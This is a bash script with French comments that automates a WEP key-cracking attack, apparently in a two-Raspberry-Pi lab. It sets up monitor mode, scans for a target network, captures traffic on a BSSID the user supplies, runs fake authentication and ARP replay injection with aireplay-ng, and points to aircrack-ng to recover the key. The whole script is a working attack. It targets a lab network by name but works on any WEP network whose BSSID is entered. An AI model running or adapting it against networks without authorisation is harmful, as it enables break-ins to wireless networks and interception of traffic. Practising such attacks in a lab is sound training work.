#!/bin/bash
# ===========================================
# ATTAQUE WEP — Pi A (kali-raspberrypi-A)
# Prérequis : wlan1 (ALFA RTL8192EU) en mode moniteur
# Cible : Pi B en mode WEP (./switch.sh wep)
# ===========================================

IFACE=wlan1
TARGET_SSID="Lab-WEP-Network"
CAPTURE_DIR="/tmp/wep_lab"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

mkdir -p $CAPTURE_DIR

echo -e "${CYAN}[*] === ATTAQUE WEP ===${NC}"
echo -e "${CYAN}[*] Cible : $TARGET_SSID${NC}"
echo ""

# ÉTAPE 1 : Mode moniteur
echo -e "${YELLOW}[1] Passage en mode moniteur...${NC}"
sudo airmon-ng check kill 2>/dev/null
sudo airmon-ng start $IFACE 2>/dev/null
# RTL8192EU garde le nom wlan1 (pas wlan1mon)
sleep 1
MODE=$(iwconfig $IFACE 2>/dev/null | grep -i "mode:monitor")
if [ -n "$MODE" ]; then
    echo -e "${GREEN}[+] Mode moniteur actif sur $IFACE${NC}"
else
    echo -e "${RED}[-] Erreur mode moniteur${NC}"
    exit 1
fi

# ÉTAPE 2 : Scan pour trouver la cible
echo -e "${YELLOW}[2] Scan — cherche $TARGET_SSID ...${NC}"
echo -e "${YELLOW}    Ctrl+C après avoir repéré le réseau${NC}"
sudo airodump-ng $IFACE

# ÉTAPE 3 (manuelle après scan) : Capturer + injecter
echo ""
read -p "Entre le BSSID de $TARGET_SSID : " BSSID
read -p "Entre le BSSID du client connecté (ou ENTER pour passer) : " CLIENT_MAC

echo -e "${YELLOW}[3] Démarrage capture ciblée...${NC}"
rm -f $CAPTURE_DIR/wep_capture*.cap
sudo airodump-ng -c 6 --bssid $BSSID \
    -w $CAPTURE_DIR/wep_capture $IFACE &
AIRODUMP_PID=$!
sleep 2

echo -e "${YELLOW}[4] Fake auth...${NC}"
sudo aireplay-ng --fakeauth 0 -a $BSSID $IFACE &
sleep 3

if [ -n "$CLIENT_MAC" ]; then
    echo -e "${YELLOW}[5] Injection ARP replay avec MAC client...${NC}"
    sudo aireplay-ng --arpreplay -b $BSSID -h $CLIENT_MAC $IFACE &
else
    echo -e "${YELLOW}[5] Injection ARP replay...${NC}"
    sudo aireplay-ng --arpreplay -b $BSSID $IFACE &
fi

echo ""
echo -e "${GREEN}[*] Attente accumulation IVs (objectif : 30 000+)${NC}"
echo -e "${GREEN}[*] Lancer dans un autre terminal :${NC}"
echo -e "${GREEN}    sudo aircrack-ng $CAPTURE_DIR/wep_capture-01.cap${NC}"
echo ""
echo -e "${YELLOW}[*] Ctrl+C pour arrêter${NC}"
wait
